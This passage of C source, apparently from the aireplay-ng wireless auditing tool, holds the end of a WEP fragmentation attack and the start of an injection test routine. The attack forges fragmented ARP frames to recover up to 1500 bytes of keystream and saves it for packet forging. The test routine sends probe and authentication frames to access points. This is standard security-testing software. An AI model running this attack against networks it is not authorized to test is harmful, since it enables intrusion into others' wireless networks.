opt.r_sip, '\\xFF', 4);\n    }\n\n    if( memcmp( opt.r_dip, NULL_MAC, 4 ) == 0 )\n    {\n        memset( opt.r_dip, '\\xFF', 4);\n    }\n\n    PCT; printf (\"Waiting for a data packet...\\n\");\n\n    while(!done)  //\n    {\n        round = 0;\n\n        if( capture_ask_packet( &caplen, 0 ) != 0 )\n            return -1;\n\n        z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;\n        if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */\n            z+=2;\n\n        if((unsigned)caplen > sizeof(packet) || (unsigned)caplen > sizeof(packet2))\n            continue;\n\n        memcpy( packet2, h80211, caplen );\n        caplen2 = caplen;\n        PCT; printf(\"Data packet found!\\n\");\n\n        if ( memcmp( packet2 +  4, SPANTREE, 6 ) == 0 ||\n             memcmp( packet2 + 16, SPANTREE, 6 ) == 0 )\n        {\n            packet2[z+4] = ((packet2[z+4] ^ 0x42) ^ 0xAA);  //0x42 instead of 0xAA\n            packet2[z+5] = ((packet2[z+5] ^ 0x42) ^ 0xAA);  //0x42 instead of 0xAA\n            packet2[z+10] = ((packet2[z+10] ^ 0x00) ^ 0x08);  //0x00 instead of 0x08\n        }\n\n        prga_len = 7;\n\n        again = RETRY;\n\n        memcpy( packet, packet2, caplen2 );\n        caplen = caplen2;\n        memcpy(prga, packet+z+4, prga_len);\n        memcpy(iv, packet+z, 4);\n\n        xor_keystream(prga, snap_header, prga_len);\n\n        while(again == RETRY)  //sending 7byte fragments\n        {\n            again = 0;\n\n            arplen=60;\n            make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, arplen);\n\n            if ((round % 2) == 1)\n            {\n                PCT; printf(\"Trying a LLC NULL packet\\n\");\n                memset(h80211+24, '\\x00', 39);\n                arplen=63;\n            }\n\n            acksgot=0;\n            packets=(arplen-24)/(prga_len-4);\n            if( (arplen-24)%(prga_len-4) != 0 )\n                packets++;\n\n            PCT; printf(\"Sending fragmented packet\\n\");\n            send_fragments(h80211, arplen, iv, prga, prga_len-4, 0);\n//            //Plus an ACK\n//            send_packet(ack, 10);\n\n            gettimeofday( &tv, NULL );\n\n\n            while (!gotit)  //waiting for relayed packet\n            {\n                caplen = read_packet(packet, sizeof(packet), NULL);\n                z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;\n                if ( ( packet[0] & 0x80 ) == 0x80 ) /* QoS */\n                    z+=2;\n\n                if (packet[0] == 0xD4 )\n                {\n                    if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC\n                    {\n                        acksgot++;\n                    }\n                    continue;\n                }\n\n                if ((packet[0] & 0x08) && (( packet[1] & 0x40 ) == 0x40) ) //Is data frame && encrypted\n                {\n                    if ( (packet[1] & 2) )  //Is a FromDS packet\n                    {\n                        if (! memcmp(opt.r_dmac, packet+4, 6)) //To our MAC\n                        {\n                            if (! memcmp(opt.r_smac, packet+16, 6)) //From our MAC\n                            {\n                                if (caplen-z < 66)  //Is short enough\n                                {\n                                    //This is our relayed packet!\n                                    PCT; printf(\"Got RELAYED packet!!\\n\");\n                                    gotit = 1;\n                                    isrelay = 1;\n                                }\n                            }\n                        }\n                    }\n                }\n\n                /* check if we got an deauthentication packet */\n\n                if( packet[0] == 0xC0 && memcmp( packet+4, opt.r_smac, 6) == 0 )\n                {\n                    PCT; printf( \"Got a deauthentication packet!\\n\" );\n                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period\n                }\n\n                /* check if we got an disassociation packet */\n\n                if( packet[0] == 0xA0 && memcmp( packet+4, opt.r_smac, 6) == 0 )\n                {\n                    PCT; printf( \"Got a disassociation packet!\\n\" );\n                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period\n                }\n\n                gettimeofday( &tv2, NULL );\n                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (100*1000) && acksgot >0 && acksgot < packets  )//wait 100ms for acks\n                {\n                    PCT; printf(\"Not enough acks, repeating...\\n\");\n                    again = RETRY;\n                    break;\n                }\n\n                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1500*1000) && !gotit) //wait 1500ms for an answer\n                {\n                    PCT; printf(\"No answer, repeating...\\n\");\n                    round++;\n                    again = RETRY;\n                    if (round > 10)\n                    {\n                        PCT; printf(\"Still nothing, trying another packet...\\n\");\n                        again = NEW_IV;\n                    }\n                    break;\n                }\n            }\n        }\n\n        if(again == NEW_IV) continue;\n\n        make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 60);\n        if (caplen-z == 68-24)\n        {\n            //Thats the ARP packet!\n//             PCT; printf(\"Thats our ARP packet!\\n\");\n        }\n        if (caplen-z == 71-24)\n        {\n            //Thats the LLC NULL packet!\n//             PCT; printf(\"Thats our LLC Null packet!\\n\");\n            memset(h80211+24, '\\x00', 39);\n        }\n\n        if (! isrelay)\n        {\n            //Building expected cleartext\n            unsigned char ct[4096] = \"\\xaa\\xaa\\x03\\x00\\x00\\x00\\x08\\x06\\x00\\x01\\x08\\x00\\x06\\x04\\x00\\x02\";\n            //Ethernet & ARP header\n\n            //Followed by the senders MAC and IP:\n            memcpy(ct+16, packet+16, 6);\n            memcpy(ct+22, opt.r_dip,  4);\n\n            //And our own MAC and IP:\n            memcpy(ct+26, opt.r_smac,   6);\n            memcpy(ct+32, opt.r_sip,   4);\n\n            //Calculating\n            memcpy(prga, packet+z+4, 36);\n            xor_keystream(prga, ct, 36);\n        }\n        else\n        {\n            memcpy(prga, packet+z+4, 36);\n            xor_keystream(prga, h80211+24, 36);\n        }\n\n        memcpy(iv, packet+z, 4);\n        round = 0;\n        again = RETRY;\n        while(again == RETRY)\n        {\n            again = 0;\n\n            PCT; printf(\"Trying to get 384 bytes of a keystream\\n\");\n\n            arplen=408;\n\n            make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, arplen);\n            if ((round % 2) == 1)\n            {\n                PCT; printf(\"Trying a LLC NULL packet\\n\");\n                memset(h80211+24, '\\x00', arplen+8);\n                arplen+=32;\n            }\n\n            acksgot=0;\n            packets=(arplen-24)/(32);\n            if( (arplen-24)%(32) != 0 )\n                packets++;\n\n            send_fragments(h80211, arplen, iv, prga, 32, 0);\n//            //Plus an ACK\n//            send_packet(ack, 10);\n\n            gettimeofday( &tv, NULL );\n\n            gotit=0;\n            while (!gotit)  //waiting for relayed packet\n            {\n                caplen = read_packet(packet, sizeof(packet), NULL);\n                z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;\n                if ( ( packet[0] & 0x80 ) == 0x80 ) /* QoS */\n                    z+=2;\n\n                if (packet[0] == 0xD4 )\n                {\n                    if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC\n                        acksgot++;\n                    continue;\n                }\n\n                if ((packet[0] & 0x08) && (( packet[1] & 0x40 ) == 0x40) ) //Is data frame && encrypted\n                {\n                    if ( (packet[1] & 2) )  //Is a FromDS packet with valid IV\n                    {\n                        if (! memcmp(opt.r_dmac, packet+4, 6)) //To our MAC\n                        {\n                            if (! memcmp(opt.r_smac, packet+16, 6)) //From our MAC\n                            {\n                                if (caplen-z > 400-24 && caplen-z < 500-24)  //Is short enough\n                                {\n                                    //This is our relayed packet!\n                                    PCT; printf(\"Got RELAYED packet!!\\n\");\n                                    gotit = 1;\n                                    isrelay = 1;\n                                }\n                            }\n                        }\n                    }\n                }\n\n                /* check if we got an deauthentication packet */\n\n                if( packet[0] == 0xC0 && memcmp( packet+4, opt.r_smac, 6) == 0 )\n                {\n                    PCT; printf( \"Got a deauthentication packet!\\n\" );\n                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period\n                }\n\n                /* check if we got an disassociation packet */\n\n                if( packet[0] == 0xA0 && memcmp( packet+4, opt.r_smac, 6) == 0 )\n                {\n                    PCT; printf( \"Got a disassociation packet!\\n\" );\n                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period\n                }\n\n                gettimeofday( &tv2, NULL );\n                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (100*1000) && acksgot >0 && acksgot < packets  )//wait 100ms for acks\n                {\n                    PCT; printf(\"Not enough acks, repeating...\\n\");\n                    again = RETRY;\n                    break;\n                }\n\n                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1500*1000) && !gotit) //wait 1500ms for an answer\n                {\n                    PCT; printf(\"No answer, repeating...\\n\");\n                    round++;\n                    again = RETRY;\n                    if (round > 10)\n                    {\n                        PCT; printf(\"Still nothing, trying another packet...\\n\");\n                        again = NEW_IV;\n                    }\n                    break;\n                }\n            }\n        }\n\n        if(again == NEW_IV) continue;\n\n        make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 408);\n        if (caplen-z == 416-24)\n        {\n            //Thats the ARP packet!\n//             PCT; printf(\"Thats our ARP packet!\\n\");\n        }\n        if (caplen-z == 448-24)\n        {\n            //Thats the LLC NULL packet!\n//             PCT; printf(\"Thats our LLC Null packet!\\n\");\n            memset(h80211+24, '\\x00', 416);\n        }\n\n        memcpy(iv, packet+z, 4);\n        memcpy(prga, packet+z+4, 384);\n        xor_keystream(prga, h80211+24, 384);\n\n        round = 0;\n        again = RETRY;\n        while(again == RETRY)\n        {\n            again = 0;\n\n            PCT; printf(\"Trying to get 1500 bytes of a keystream\\n\");\n\n            make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 1500);\n            arplen=1500;\n            if ((round % 2) == 1)\n            {\n                PCT; printf(\"Trying a LLC NULL packet\\n\");\n                memset(h80211+24, '\\x00', 1508);\n                arplen+=32;\n            }\n\n            acksgot=0;\n            packets=(arplen-24)/(300);\n            if( (arplen-24)%(300) != 0 )\n                packets++;\n\n            send_fragments(h80211, arplen, iv, prga, 300, 0);\n//            //Plus an ACK\n//            send_packet(ack, 10);\n\n            gettimeofday( &tv, NULL );\n\n            gotit=0;\n            while (!gotit)  //waiting for relayed packet\n            {\n                caplen = read_packet(packet, sizeof(packet), NULL);\n                z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;\n                if ( ( packet[0] & 0x80 ) == 0x80 ) /* QoS */\n                    z+=2;\n\n                if (packet[0] == 0xD4 )\n                {\n                    if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC\n                        acksgot++;\n                    continue;\n                }\n\n                if ((packet[0] & 0x08) && (( packet[1] & 0x40 ) == 0x40) ) //Is data frame && encrypted\n                {\n                    if ( (packet[1] & 2) )  //Is a FromDS packet with valid IV\n                    {\n                        if (! memcmp(opt.r_dmac, packet+4, 6)) //To our MAC\n                        {\n                            if (! memcmp(opt.r_smac, packet+16, 6)) //From our MAC\n                            {\n                                if (caplen-z > 1496-24)  //Is short enough\n                                {\n                                    //This is our relayed packet!\n                                    PCT; printf(\"Got RELAYED packet!!\\n\");\n                                    gotit = 1;\n                                    isrelay = 1;\n                                }\n                            }\n                        }\n                    }\n                }\n\n                /* check if we got an deauthentication packet */\n\n                if( packet[0] == 0xC0 && memcmp( packet+4, opt.r_smac, 6) == 0 )\n                {\n                    PCT; printf( \"Got a deauthentication packet!\\n\" );\n                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period\n                }\n\n                /* check if we got an disassociation packet */\n\n                if( packet[0] == 0xA0 && memcmp( packet+4, opt.r_smac, 6) == 0 )\n                {\n                    PCT; printf( \"Got a disassociation packet!\\n\" );\n                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period\n                }\n\n                gettimeofday( &tv2, NULL );\n                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (100*1000) && acksgot >0 && acksgot < packets  )//wait 100ms for acks\n                {\n                    PCT; printf(\"Not enough acks, repeating...\\n\");\n                    again = RETRY;\n                    break;\n                }\n\n                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1500*1000) && !gotit) //wait 1500ms for an answer\n                {\n                    PCT; printf(\"No answer, repeating...\\n\");\n                    round++;\n                    again = RETRY;\n                    if (round > 10)\n                    {\n                        printf(\"Still nothing, quitting with 384 bytes? [y/n] \\n\");\n                        fflush( stdout );\n                        ret=0;\n                        while(!ret) ret = scanf( \"%s\", tmpbuf );\n\n                        printf( \"\\n\" );\n\n                        if( tmpbuf[0] == 'y' || tmpbuf[0] == 'Y' )\n                            again = ABORT;\n                        else\n                            again = NEW_IV;\n                    }\n                    break;\n                }\n            }\n        }\n\n        if(again == NEW_IV) continue;\n\n        if(again == ABORT) length = 408;\n        else length = 1500;\n\n        make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, length);\n        if (caplen == length+8+z)\n        {\n            //Thats the ARP packet!\n//             PCT; printf(\"Thats our ARP packet!\\n\");\n        }\n        if (caplen == length+16+z)\n        {\n            //Thats the LLC NULL packet!\n//             PCT; printf(\"Thats our LLC Null packet!\\n\");\n            memset(h80211+24, '\\x00', length+8);\n        }\n\n        if(again != ABORT)\n        {\n            memcpy(iv, packet+z, 4);\n            memcpy(prga, packet+z+4, length);\n            xor_keystream(prga, h80211+24, length);\n        }\n\n        lt = localtime( (const time_t *) &tv.tv_sec );\n\n        memset( strbuf, 0, sizeof( strbuf ) );\n        snprintf( strbuf,  sizeof( strbuf ) - 1,\n                  \"fragment-%02d%02d-%02d%02d%02d.xor\",\n                  lt->tm_mon + 1, lt->tm_mday,\n                  lt->tm_hour, lt->tm_min, lt->tm_sec );\n        save_prga(strbuf, iv, prga, length);\n\n        printf( \"Saving keystream in %s\\n\", strbuf );\n        printf(\"Now you can build a packet with packetforge-ng out of that %d bytes keystream\\n\", length);\n\n        done=1;\n\n    }\n\n    return( 0 );\n}\n\nint grab_essid(unsigned char* packet, int len)\n{\n    int i=0, j=0, pos=0, tagtype=0, taglen=0, chan=0;\n    unsigned char bssid[6];\n\n    memcpy(bssid, packet+16, 6);\n    taglen = 22;    //initial value to get the fixed tags parsing started\n    taglen+= 12;    //skip fixed tags in frames\n    do\n    {\n        pos    += taglen + 2;\n        tagtype = packet[pos];\n        taglen  = packet[pos+1];\n    } while(tagtype != 3 && pos < len-2);\n\n    if(tagtype != 3) return -1;\n    if(taglen != 1) return -1;\n    if(pos+2+taglen > len) return -1;\n\n    chan = packet[pos+2];\n\n    pos=0;\n\n    taglen = 22;    //initial value to get the fixed tags parsing started\n    taglen+= 12;    //skip fixed tags in frames\n    do\n    {\n        pos    += taglen + 2;\n        tagtype = packet[pos];\n        taglen  = packet[pos+1];\n    } while(tagtype != 0 && pos < len-2);\n\n    if(tagtype != 0) return -1;\n    if(taglen > 250) taglen = 250;\n    if(pos+2+taglen > len) return -1;\n\n    for(i=0; i<20; i++)\n    {\n        if( ap[i].set)\n        {\n            if( memcmp(bssid, ap[i].bssid, 6) == 0 )    //got it already\n            {\n                if(packet[0] == 0x50 && !ap[i].found)\n                {\n                    ap[i].found++;\n                }\n                if(ap[i].chan == 0) ap[i].chan=chan;\n                break;\n            }\n        }\n        if(ap[i].set == 0)\n        {\n            for(j=0; j<taglen; j++)\n            {\n                if(packet[pos+2+j] < 32 || packet[pos+2+j] > 127)\n                {\n                    return -1;\n                }\n            }\n\n            ap[i].set = 1;\n            ap[i].len = taglen;\n            memcpy(ap[i].essid, packet+pos+2, taglen);\n            ap[i].essid[taglen] = '\\0';\n            memcpy(ap[i].bssid, bssid, 6);\n            ap[i].chan = chan;\n            if(packet[0] == 0x50) ap[i].found++;\n            return 0;\n        }\n    }\n    return -1;\n}\n\nstatic int get_ip_port(char *iface, char *ip, const int ip_size)\n{\n\tchar *host;\n\tchar *ptr;\n\tint port = -1;\n\tstruct in_addr addr;\n\n\thost = strdup(iface);\n\tif (!host)\n\t\treturn -1;\n\n\tptr = strchr(host, ':');\n\tif (!ptr)\n\t\tgoto out;\n\n\t*ptr++ = 0;\n\n\tif (!inet_aton(host, (struct in_addr *)&addr))\n\t\tgoto out; /* XXX resolve hostname */\n\n\tif(strlen(host) > 15)\n        {\n            port = -1;\n            goto out;\n        }\n\tstrncpy(ip, host, ip_size);\n\tport = atoi(ptr);\n        if(port <= 0) port = -1;\n\nout:\n\tfree(host);\n\treturn port;\n}\n\nvoid dump_packet(unsigned char* packet, int len)\n{\n    int i=0;\n\n    for(i=0; i<len; i++)\n    {\n        if(i>0 && i%4 == 0)printf(\" \");\n        if(i>0 && i%16 == 0)printf(\"\\n\");\n        printf(\"%02X \", packet[i]);\n    }\n    printf(\"\\n\\n\");\n}\n\nstruct net_hdr {\n\tuint8_t\t\tnh_type;\n\tuint32_t\tnh_len;\n\tuint8_t\t\tnh_data[0];\n} __packed;\n\nint tcp_test(const char* ip_str, const short port)\n{\n    int sock, i;\n    struct sockaddr_in s_in;\n    int packetsize = 1024;\n    unsigned char packet[packetsize];\n    struct timeval tv, tv2, tv3;\n    int caplen = 0;\n    int times[REQUESTS];\n    int min, avg, max, len;\n    struct net_hdr nh;\n\n    tv3.tv_sec=0;\n    tv3.tv_usec=1;\n\n    s_in.sin_family = PF_INET;\n    s_in.sin_port = htons(port);\n    if (!inet_aton(ip_str, &s_in.sin_addr))\n            return -1;\n\n    if ((sock = socket(s_in.sin_family, SOCK_STREAM, IPPROTO_TCP)) == -1)\n            return -1;\n\n    /* avoid blocking on reading the socket */\n    if( fcntl( sock, F_SETFL, O_NONBLOCK ) < 0 )\n    {\n        perror( \"fcntl(O_NONBLOCK) failed\" );\n        return( 1 );\n    }\n\n    gettimeofday( &tv, NULL );\n\n    while (1)  //waiting for relayed packet\n    {\n        if (connect(sock, (struct sockaddr*) &s_in, sizeof(s_in)) == -1)\n        {\n            if(errno != EINPROGRESS && errno != EALREADY)\n            {\n                perror(\"connect\");\n                close(sock);\n\n                printf(\"Failed to connect\\n\");\n\n                return -1;\n            }\n        }\n        else\n        {\n            gettimeofday( &tv2, NULL );\n            break;\n        }\n\n        gettimeofday( &tv2, NULL );\n        //wait 3000ms for a successful connect\n        if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (3000*1000))\n        {\n            printf(\"Connection timed out\\n\");\n            close(sock);\n            return(-1);\n        }\n        usleep(10);\n    }\n\n    PCT; printf(\"TCP connection successful\\n\");\n\n    //trying to identify airserv-ng\n    memset(&nh, 0, sizeof(nh));\n//     command: GET_CHAN\n    nh.nh_type\t= 2;\n    nh.nh_len\t= htonl(0);\n\n    if (send(sock, &nh, sizeof(nh), 0) != sizeof(nh))\n    {\n        perror(\"send\");\n        return -1;\n    }\n\n    gettimeofday( &tv, NULL );\n    i=0;\n\n    while (1)  //waiting for GET_CHAN answer\n    {\n        caplen = read(sock, &nh, sizeof(nh));\n\n        if(caplen == -1)\n        {\n            if( errno != EAGAIN )\n            {\n                perror(\"read\");\n                return -1;\n            }\n        }\n\n        if( (unsigned)caplen == sizeof(nh))\n        {\n            len = ntohl(nh.nh_len);\n            if (len > 1024 || len < 0)\n                continue;\n            if( nh.nh_type == 1 && i==0 )\n            {\n                i=1;\n                caplen = read(sock, packet, len);\n                if(caplen == len)\n                {\n                    i=2;\n                    break;\n                }\n                else\n                {\n                    i=0;\n                }\n            }\n            else\n            {\n                caplen = read(sock, packet, len);\n            }\n        }\n\n        gettimeofday( &tv2, NULL );\n        //wait 1000ms for an answer\n        if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1000*1000))\n        {\n            break;\n        }\n        if(caplen == -1)\n            usleep(10);\n    }\n\n    if(i==2)\n    {\n        PCT; printf(\"airserv-ng found\\n\");\n    }\n    else\n    {\n        PCT; printf(\"airserv-ng NOT found\\n\");\n    }\n\n    close(sock);\n\n    for(i=0; i<REQUESTS; i++)\n    {\n        if ((sock = socket(s_in.sin_family, SOCK_STREAM, IPPROTO_TCP)) == -1)\n                return -1;\n\n        /* avoid blocking on reading the socket */\n        if( fcntl( sock, F_SETFL, O_NONBLOCK ) < 0 )\n        {\n            perror( \"fcntl(O_NONBLOCK) failed\" );\n            return( 1 );\n        }\n\n        usleep(1000);\n\n        gettimeofday( &tv, NULL );\n\n        while (1)  //waiting for relayed packet\n        {\n            if (connect(sock, (struct sockaddr*) &s_in, sizeof(s_in)) == -1)\n            {\n                if(errno != EINPROGRESS && errno != EALREADY)\n                {\n                    perror(\"connect\");\n                    close(sock);\n\n                    printf(\"Failed to connect\\n\");\n\n                    return -1;\n                }\n            }\n            else\n            {\n                gettimeofday( &tv2, NULL );\n                break;\n            }\n\n            gettimeofday( &tv2, NULL );\n            //wait 1000ms for a successful connect\n            if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1000*1000))\n            {\n                break;\n            }\n            //simple \"high-precision\" usleep\n            select(1, NULL, NULL, NULL, &tv3);\n        }\n        times[i] = ((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec));\n        printf( \"\\r%d/%d\\r\", i, REQUESTS);\n        fflush(stdout);\n        close(sock);\n    }\n\n    min = INT_MAX;\n    avg = 0;\n    max = 0;\n\n    for(i=0; i<REQUESTS; i++)\n    {\n        if(times[i] < min) min = times[i];\n        if(times[i] > max) max = times[i];\n        avg += times[i];\n    }\n    avg /= REQUESTS;\n\n    PCT; printf(\"ping %s:%d (min/avg/max): %.3fms/%.3fms/%.3fms\\n\", ip_str, port, min/1000.0, avg/1000.0, max/1000.0);\n\n    return 0;\n}\n\nint do_attack_test()\n{\n    unsigned char packet[4096];\n    struct timeval tv, tv2, tv3;\n    int len=0, i=0, j=0, k=0;\n    int gotit=0, answers=0, found=0;\n    int caplen=0, essidlen=0;\n    unsigned int min, avg, max;\n    int ret=0;\n    float avg2;\n    struct rx_info ri;\n    int atime=200;  //time in ms to wait for answer packet (needs to be higher for airserv)\n    unsigned char nulldata[1024];\n\n    if(opt.port_out > 0)\n    {\n        atime += 200;\n        PCT; printf(\"Testing connection to injection device %s\\n\", opt.iface_out);\n        ret = tcp_test(opt.ip_out, opt.port_out);\n        if(ret != 0)\n        {\n            return( 1 );\n        }\n        printf(\"\\n\");\n\n        /* open the replay interface */\n        _wi_out = wi_open(opt.iface_out);\n        if (!_wi_out)\n            return 1;\n        printf(\"\\n\");\n        dev.fd_out = wi_fd(_wi_out);\n        wi_get_mac(_wi_out, dev.mac_out);\n        if(opt.s_face == NULL)\n        {\n            _wi_in = _wi_out;\n            dev.fd_in = dev.fd_out;\n\n            /* XXX */\n            dev.arptype_in = dev.arptype_out;\n            wi_get_mac(_wi_in, dev.mac_in);\n        }\n    }\n\n    if(opt.s_face && opt.port_in > 0)\n    {\n        atime += 200;\n        PCT; printf(\"Testing connection to capture device %s\\n\", opt.s_face);\n        ret = tcp_test(opt.ip_in, opt.port_in);\n        if(ret != 0)\n        {\n            return( 1 );\n        }\n        printf(\"\\n\");\n\n        /* open the packet source */\n        _wi_in = wi_open(opt.s_face);\n        if (!_wi_in)\n            return 1;\n        dev.fd_in = wi_fd(_wi_in);\n        wi_get_mac(_wi_in, dev.mac_in);\n        printf(\"\\n\");\n    }\n    else if(opt.s_face && opt.port_in <= 0)\n    {\n        _wi_in = wi_open(opt.s_face);\n        if (!_wi_in)\n            return 1;\n        dev.fd_in = wi_fd(_wi_in);\n        wi_get_mac(_wi_in, dev.mac_in);\n        printf(\"\\n\");\n    }\n\n    if(opt.port_in <= 0)\n    {\n        /* avoid blocking on reading the socket */\n        if( fcntl( dev.fd_in, F_SETFL, O_NONBLOCK ) < 0 )\n        {\n            perror( \"fcntl(O_NONBLOCK) failed\" );\n            return( 1 );\n        }\n    }\n\n    if(getnet(NULL, 0, 0) != 0)\n        return 1;\n\n    srand( time( NULL ) );\n\n    memset(ap, '\\0', 20*sizeof(struct APt));\n\n    essidlen = strlen(opt.r_essid);\n    if( essidlen > 250) essidlen = 250;\n\n    if( essidlen > 0 )\n    {\n        ap[0].set = 1;\n        ap[0].found = 0;\n        ap[0].len = essidlen;\n        memcpy(ap[0].essid, opt.r_essid, essidlen);\n        ap[0].essid[essidlen] = '\\0';\n        memcpy(ap[0].bssid, opt.r_bssid, 6);\n        found++;\n    }\n\n    if(opt.bittest)\n        set_bitrate(_wi_out, RATE_1M);\n\n    PCT; printf(\"Trying broadcast probe requests...\\n\");\n\n    memcpy(h80211, PROBE_REQ, 24);\n\n    len = 24;\n\n    h80211[24] = 0x00;      //ESSID Tag Number\n    h80211[25] = 0x00;      //ESSID Tag Length\n\n    len += 2;\n\n    memcpy(h80211+len, RATES, 16);\n\n    len += 16;\n\n    gotit=0;\n    answers=0;\n    for(i=0; i<3; i++)\n    {\n        /*\n            random source so we can identify our packets\n        */\n        opt.r_smac[0] = 0x00;\n        opt.r_smac[1] = rand() & 0xFF;\n        opt.r_smac[2] = rand() & 0xFF;\n        opt.r_smac[3] = rand() & 0xFF;\n        opt.r_smac[4] = rand() & 0xFF;\n        opt.r_smac[5] = rand() & 0xFF;\n\n        memcpy(h80211+10, opt.r_smac, 6);\n\n        send_packet(h80211, len);\n\n        gettimeofday( &tv, NULL );\n\n        while (1)  //waiting for relayed packet\n        {\n            caplen = read_packet(packet, sizeof(packet), &ri);\n\n            if (packet[0] == 0x50 ) //Is probe response\n            {\n                if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC\n                {\n                    if(grab_essid(packet, caplen) == 0 && (!memcmp(opt.r_bssid, NULL_MAC, 6)))\n                    {\n                        found++;\n                    }\n                    if(!answers)\n                    {\n                        PCT; printf(\"Injection is working!\\n\");\n                        if(opt.fast) return 0;\n                        gotit=1;\n                        answers++;\n                    }\n                }\n            }\n\n            if (packet[0] == 0x80 ) //Is beacon frame\n            {\n                if(grab_essid(packet, caplen) == 0 && (!memcmp(opt.r_bssid, NULL_MAC, 6)))\n                {\n                    found++;\n                }\n            }\n\n            gettimeofday( &tv2, NULL );\n            if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (3*atime*1000)) //wait 'atime'ms for an answer\n            {\n                break;\n            }\n        }\n    }\n    if(answers == 0)\n    {\n        PCT; printf(\"No Answer...\\n\");\n    }\n\n    PCT; printf(\"Found %d AP%c\\n\", found, ((found == 1) ? ' ' : 's' ) );\n\n    if(found > 0)\n    {\n        printf(\"\\n\");\n        PCT; printf(\"Trying directed probe requests...\\n\");\n    }\n\n    for(i=0; i<found; i++)\n    {\n        if(wi_get_channel(_wi_out) != ap[i].chan)\n        {\n            wi_set_channel(_wi_out, ap[i].chan);\n        }\n\n        if(wi_get_channel(_wi_in) != ap[i].chan)\n        {\n            wi_set_channel(_wi_in, ap[i].chan);\n        }\n\n        PCT; printf(\"%02X:%02X:%02X:%02X:%02X:%02X - channel: %d - \\'%s\\'\\n\", ap[i].bssid[0], ap[i].bssid[1],\n                    ap[i].bssid[2], ap[i].bssid[3], ap[i].bssid[4], ap[i].bssid[5], ap[i].chan, ap[i].essid);\n\n        ap[i].found=0;\n        min = INT_MAX;\n        max = 0;\n        avg = 0;\n        avg2 = 0;\n\n        memcpy(h80211, PROBE_REQ, 24);\n\n        len = 24;\n\n        h80211[24] = 0x00;      //ESSID Tag Number\n        h80211[25] = ap[i].len; //ESSID Tag Length\n        memcpy(h80211+len+2, ap[i].essid, ap[i].len);\n\n        len += ap[i].len+2;\n\n        memcpy(h80211+len, RATES, 16);\n\n        len += 16;\n\n        for(j=0; j<REQUESTS; j++)\n        {\n            /*\n                random source so we can identify our packets\n            */\n            opt.r_smac[0] = 0x00;\n            opt.r_smac[1] = rand() & 0xFF;\n            opt.r_smac[2] = rand() & 0xFF;\n            opt.r_smac[3] = rand() & 0xFF;\n            opt.r_smac[4] = rand() & 0xFF;\n            opt.r_smac[5] = rand() & 0xFF;\n\n            //build/send probe request\n            memcpy(h80211+10, opt.r_smac, 6);\n\n            send_packet(h80211, len);\n            usleep(10);\n\n            //build/send request-to-send\n            memcpy(nulldata, RTS, 16);\n            memcpy(nulldata+4, ap[i].bssid, 6);\n            memcpy(nulldata+10, opt.r_smac, 6);\n\n            send_packet(nulldata, 16);\n            usleep(10);\n\n            //build/send null data packet\n            memcpy(nulldata, NULL_DATA, 24);\n            memcpy(nulldata+4, ap[i].bssid, 6);\n            memcpy(nulldata+10, opt.r_smac, 6);\n            memcpy(nulldata+16, ap[i].bssid, 6);\n\n            send_packet(nulldata, 24);\n            usleep(10);\n\n            //build/send auth request packet\n            memcpy(nulldata, AUTH_REQ, 30);\n            memcpy(nulldata+4, ap[i].bssid, 6);\n            memcpy(nulldata+10, opt.r_smac, 6);\n            memcpy(nulldata+16, ap[i].bssid, 6);\n\n            send_packet(nulldata, 30);\n\n            //continue\n            gettimeofday( &tv, NULL );\n\n            printf( \"\\r%2d/%2d: %3d%%\\r\", ap[i].found, j+1, ((ap[i].found*100)/(j+1)));\n            fflush(stdout);\n            while (1)  //waiting for relayed packet\n            {\n                caplen = read_packet(packet, sizeof(packet), &ri);\n\n                if (packet[0] == 0x50 ) //Is probe response\n                {\n                    if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC\n                    {\n                        if(! memcmp(ap[i].bssid, packet+16, 6)) //From the mentioned AP\n                        {\n                            gettimeofday( &tv3, NULL);\n                            ap[i].ping[j] = ((tv3.tv_sec*1000000 - tv.tv_sec*1000000) + (tv3.tv_usec - 